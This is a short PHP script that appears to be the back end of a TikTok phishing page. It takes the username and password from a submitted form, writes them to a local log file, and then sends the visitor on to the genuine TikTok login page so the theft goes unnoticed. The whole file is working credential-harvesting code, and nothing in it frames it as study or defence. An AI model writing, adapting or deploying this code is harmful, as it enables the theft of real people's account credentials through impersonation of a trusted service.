<?php

$path = "/home/lioren/PycharmProjects/TryToCatch/log.txt";
$dataname = "Username: " . $_POST['username'] . "\n";
$datapass = "Pass: " . $_POST['password'] . "\n";
file_put_contents($path, $dataname);
file_put_contents($path, $datapass, FILE_APPEND);

header ("location: https://www.tiktok.com/login");
exit();
?>











https://www.tiktok.com/login
